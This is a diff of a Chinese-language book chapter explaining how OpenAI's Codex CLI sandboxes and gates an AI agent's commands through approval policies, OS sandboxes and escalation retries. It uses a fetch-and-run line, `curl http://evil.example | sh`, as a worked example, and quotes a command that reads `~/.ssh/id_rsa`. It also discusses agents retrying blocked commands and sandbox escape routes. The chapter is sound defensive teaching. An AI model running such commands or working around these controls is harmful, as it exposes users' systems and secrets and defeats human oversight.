@@ -14,7 +14,7 @@
     <header class="chap-head">
       <p class="kicker">第四部 · 取舍</p>
       <h1>第 12 章 · codex：工业级约束</h1>
-      <p class="lead">OpenAI 官方 CLI 的主体在 Rust。工业级不是更长的系统提示，是：模型进程和被它喊起来的命令不在同一个权限域里。</p>
+      <p class="lead">OpenAI 官方 CLI 的主体在 Rust。工业级不是更长的系统提示，是：模型进程和被它喊起来的命令不在同一个权限域里。这一章会把手伸进提交/事件协议、审批与沙箱那两个旋钮，以及一次命令真正被拦住时循环看见什么。</p>
     </header>
     <article class="prose">
       <div class="plain-box">
@@ -89,6 +89,83 @@ bash("cat ~/.ssh/id_rsa")
         </tbody>
       </table>
       <p>nanocode 只有 YOLO。把危险默认成唯一选项，和把危险做成显式、吓人的名字，是两种产品道德。pi 站前一种（并告诉你去容器化）；Codex 站后一种。</p>
+
+      <h2>打开哪几个文件（快照 rust-v0.155.0-alpha.6）</h2>
+      <ul>
+        <li><a href="https://github.com/openai/codex/blob/main/codex-rs/docs/protocol_v1.md">codex-rs/docs/protocol_v1.md</a> —— 皮肤怎么跟核心说话：<code>Op</code> 进去，<code>EventMsg</code> 出来。</li>
+        <li><a href="https://github.com/openai/codex/blob/main/codex-rs/core/README.md">codex-rs/core/README.md</a> —— 三个平台的沙箱依赖和「什么时候失效」。</li>
+        <li><code>codex-rs/core/src/tools/orchestrator.rs</code> —— 审批 → 选沙箱 → 尝试 → 升级重试。</li>
+        <li><code>codex-rs/core/src/tools/approvals.rs</code> —— 什么时候问人，问的是哪一种动作。</li>
+        <li>官方安全文档（developers.openai.com/codex/security）—— 产品语言；和源码对照着读。</li>
+      </ul>
+
+      <h2>手算：模型要 curl，两个旋钮分别说了什么</h2>
+      <p>会话在 <code>/proj</code>。沙箱是 workspace-write，审批是「出界再问」。模型点名 bash：<code>curl http://evil.example | sh</code>。</p>
+      <ol class="steps">
+        <li><strong>皮肤提交 <code>Op::UserTurn</code>。</strong>这一票带着这一轮的 cwd、审批策略、沙箱策略、模型。不是「先设好全局再聊天」——每一轮都可以把旋钮拧到不同档。</li>
+        <li><strong>核心吐出流式事件。</strong>文本增量、然后 <code>ExecCommandBegin</code>。界面只订阅，不同步调用循环。</li>
+        <li><strong>编排器走固定四拍</strong>（orchestrator.rs 顶部注释）：先审批，再选沙箱，再尝试，被拒绝且策略允许时再升级重试。审批结果会缓存，升级重试不必再问一遍人——除非策略说必须。</li>
+        <li><strong>沙箱这一拍。</strong>workspace-write 允许写 <code>/proj</code>，默认不给任意出站网络。curl 出界。OS 强制拦下，不是提示词劝阻。</li>
+        <li><strong>拒绝必须长得不像「命令自己失败」。 </strong>退出码 1 和「策略不允许」是两种观察。模型看见前者会改写法再试（越狱）；看见后者应该换策略或问人。</li>
+        <li><strong>若审批策略允许升级。</strong>编排器可以再跑一次更松的沙箱。人已经点过头，缓存让第二次不必弹窗。若策略是 Never，就停在拒绝，把原始输出原样送回。</li>
+      </ol>
+      <figure class="code">
+        <figcaption>这一轮核心对外的形状（人话）</figcaption>
+        <pre><code>皮肤 → Op::UserTurn { cwd=/proj, sandbox=workspace-write, approval=on-request }
+核心 → EventMsg::TurnStarted
+    → AgentMessageContentDelta × N
+    → ExecCommandBegin { argv: ["curl", ...] }
+    → （沙箱拒绝）ExecCommandEnd / 带拒绝码的失败
+    → 若要升级：再问人或走缓存 → 第二次尝试
+    → TurnComplete 或 Error</code></pre>
+      </figure>
+      <p>miniharness 的路径笼子在第 4 步之前就结束了：它挡得住 <code>read("../secrets")</code>，挡不住 curl。超时杀掉也不算沙箱——超时后的进程可能已经发出了请求。</p>
+
+      <h2>提交/事件：一套核心，多张脸</h2>
+      <p>协议把方向说死：皮肤提交 <code>Op</code>，核心吐出 <code>Event</code>。每条事件的 id 对上启动这一轮的那次提交。枚举是 <code>non_exhaustive</code>——以后会加变体，皮肤必须能忽略不认识的。</p>
+      <table class="plain">
+        <thead><tr><th>方向</th><th>你至少要认得</th><th>人话</th></tr></thead>
+        <tbody>
+          <tr><td>Op</td><td>UserTurn / Interrupt / ExecApproval</td><td>开工、停、点头或摇头</td></tr>
+          <tr><td>EventMsg</td><td>TurnStarted / AgentMessageContentDelta / ExecCommandBegin/End / ExecApprovalRequest / TurnComplete / TurnAborted / Error</td><td>开始了、字、命令、请点头、正常结束、被打断、出错</td></tr>
+        </tbody>
+      </table>
+      <p>#14005 之后，无头 exec 也走进程内的 app-server，不再直接接线 ThreadManager。TUI、CI、IDE 必须是同一条水管。修三遍循环，是这个协议要避免的事。</p>
+      <p><code>Op::Interrupt</code> 等的是 <code>EventMsg::TurnAborted</code> 才算停干净。后台终端默认不一起杀——另有专门的清理 op。停循环和停子进程是两件事，dsh 后来也投了同一票。</p>
+
+      <h2>编排器：审批、沙箱、升级重试</h2>
+      <p>任意 ToolRuntime 都走同一段：</p>
+      <figure class="code">
+        <figcaption>orchestrator 的四拍</figcaption>
+        <pre><code>approval          该不该问人？问过的缓存起来
+select sandbox    按 PermissionProfile 选 Seatbelt / Landlock+bwrap / 受限令牌 / None
+attempt           套住整棵子进程树，不是只套父进程
+on denial         若工具声明 escalate_on_failure 且策略允许：
+                  换更松的沙箱再试一次（通常不再问人）</code></pre>
+      </figure>
+      <p>两件容易拧成一股的事，这里必须拆开：</p>
+      <ul>
+        <li>文件系统策略和网络策略是两份（#13439）。合成一个旧的 <code>SandboxPolicy</code> 投影，会把「这个子路径不可读」弄丢。Seatbelt 生成器必须直接吃拆开的策略（#13448），不能在落到 OS 时再合成回去。</li>
+        <li>审批问的动作有好几种：跑命令、打补丁、MCP 调用、网络出站。不是一个「危险/不危险」布尔。</li>
+      </ul>
+      <p>Linux 上，拆开策略如果还能无损圆成旧模型，可以继续走老 Landlock；需要「可写根下面挖只读洞」这种形状，自动改走 bubblewrap。圆不回去就 fail closed，不要假装有沙箱。</p>
+
+      <h2>arg0 诡计：一个文件，两种人格</h2>
+      <p>#1086 把 Linux 沙箱从「在当前线程上套 Landlock/seccomp 再 spawn」改成独立 helper。单文件分发不想带两个二进制，于是同一个文件看 <code>argv[0]</code>：叫 <code>codex-linux-sandbox</code> 时，它是沙箱助手；否则是 CLI。</p>
+      <p>core README 写明：包含 core 的那个二进制，必须在 arg0 等于这个名字时表现得像 <code>codex sandbox</code>。文档和测试都要覆盖这条分叉。容器里 bubblewrap 可能造不出 user namespace——WSL1 直接拒绝走 bwrap 的命令，而不是静默降级成「其实没沙箱」。工业级文档的标志，就是把失效模式写清楚。</p>
+      <p>被关进沙箱的是<strong>子命令整棵进程树</strong>。CLI 自己还要画画、读配置、找密钥，不能把自己也关进去。</p>
+
+      <h2>三个平台，一种权限语言</h2>
+      <ul>
+        <li>macOS：<code>/usr/bin/sandbox-exec</code>。workspace-write 时，可写根下面的 <code>.git</code> 和 <code>.codex</code> 仍只读。#42590 还要挡「往你的 tty 灌命令」。</li>
+        <li>Linux：优先 PATH 上的 bwrap（且不在 cwd 里那个，防投毒），太旧就走兼容路径；没有就用随包装的。Landlock + seccomp 按内核能力降级。</li>
+        <li>Windows：受限令牌 + ACL。拆开策略只有能被当前后端直接执行、或能无损圆成旧模型时才放行；需要「显式不可读挖空」而后端做不到，就 fail closed。</li>
+      </ul>
+      <p>#44286 堵住 WSL 互操作逃逸：Linux 侧收紧了，经 Windows 绕出去等于零。沙箱 crate 后来抽到 <code>codex-sandboxing</code>（#15592 / #15603）：选沙箱、变形请求、真正 spawn，应该是同一个包的故事。</p>
+
+      <h2>AGENTS.md：规矩跟着仓库走</h2>
+      <p>发现顺序大体是：全局 <code>~/.codex/AGENTS.md</code>（可被 override 盖掉）→ 从项目根走到 cwd，每层最多一份。有字节上限。#29810 让它随远程环境就绪而刷新，写成可持久化的 WorldState；resume/fork 时若说明书变了，只注入一次替换。#44675 让人改了全局说明书，下一轮就该看见。</p>
+      <p>这是「穿越模型迭代」的少数手段之一。miniharness 还没读它。加一段「若工作区有 AGENTS.md，放进 system」，是最小的生产化步骤。</p>
 
       <h2>先把「全部 PR」这件事说清楚</h2>
       <div class="census">
@@ -205,22 +282,10 @@ gh search prs --repo openai/codex --merged AGENTS.md --limit 50</code></pre>
         </tbody>
       </table>
 
-      <h2>约束下沉到操作系统</h2>
-      <ul>
-        <li>macOS：Seatbelt（<code>sandbox-exec</code> 一套默认拒绝的配置）。</li>
-        <li>Linux：bubblewrap + Landlock + seccomp 的组合，随内核能力降级；helper 用 arg0 藏在同一二进制里。</li>
-        <li>Windows：受限令牌 + ACL。快照前几周还在拆服务、补卸载清理（#45455、#45799）。</li>
-        <li>被关进沙箱的是<strong>子命令整棵进程树</strong>，不是整个 CLI 进程。</li>
-      </ul>
-      <p>容器里这些机制可能不可用，文档会叫你在外层容器隔离，然后内层放开。工业级文档的标志是：把「什么时候失效」写清楚。</p>
       <div class="callout">
         <p class="label">先别管</p>
         <p>具体系统调用表、Seatbelt 配置文件字段、审批模式在某次 alpha 里叫 untrusted 还是 permissive。那些会随内核和发版改。你要带走的是分层：Python 礼貌围栏 → 人点头 → OS 强制。以及：拒绝必须能和「命令自己失败」区分开，否则模型会在不该重试的时候重试。</p>
       </div>
-
-      <h2>AGENTS.md：把规矩写进仓库</h2>
-      <p>项目级说明书，启动时读入上下文，并在环境变化时刷新。这是「穿越模型迭代」的少数手段之一：把「测试怎么跑、哪些目录别动」写在仓库里，而不是写在某年某月的电子书。</p>
-      <p>发现顺序大体是：全局 <code>~/.codex/AGENTS.md</code>（可被 override 文件盖掉）→ 从项目根走到 cwd，每层最多一份。有字节上限。你的 miniharness 还没读它。加一段「若工作区有 AGENTS.md，把它放进 system 提示」，是最小的生产化步骤，也不依赖任何框架。</p>
 
       <h2>读这个仓库时问什么</h2>
       <ul>
@@ -237,6 +302,8 @@ gh search prs --repo openai/codex --merged AGENTS.md --limit 50</code></pre>
         <li>miniharness 把 bash 超时杀掉，算不算沙箱？</li>
         <li>模型读到「操作被拒绝」和「文件不存在」，下一步分别可能怎样？</li>
         <li>#1086 的 arg0 诡计在换什么、付什么？</li>
+        <li>皮肤提交 Interrupt 之后，怎样才算停干净？</li>
+        <li>文件系统策略在 Rust 里拆开了，落到 Seatbelt 时又合成一个投影，会发生什么？</li>
       </ul>
       <details class="answer">
         <summary>自测答案</summary>
@@ -245,6 +312,8 @@ gh search prs --repo openai/codex --merged AGENTS.md --limit 50</code></pre>
           <li>不算。超时是预算，不是权限隔离。超时后的进程如果没被真正隔离，仍可能已经发出了网络请求。</li>
           <li>拒绝：应该换策略或问人，不该换一种写法硬闯（那是在越狱）。文件不存在：可以改路径再试。所以拒绝码要单独标明。</li>
           <li>换的是「单文件分发 + 整棵子进程树进沙箱」。付的是：同一个二进制有两种人格，启动时必须先看 arg0。文档和测试都要覆盖这条分叉。</li>
+          <li>等到 <code>EventMsg::TurnAborted</code>，不是把 Interrupt 发出去就当停了。后台终端默认还活着。</li>
+          <li>等于没拆。「这个子路径不可读」会在投影里弄丢。#13448 要解决的就是这件事。</li>
         </ol>
       </details>
     </article>
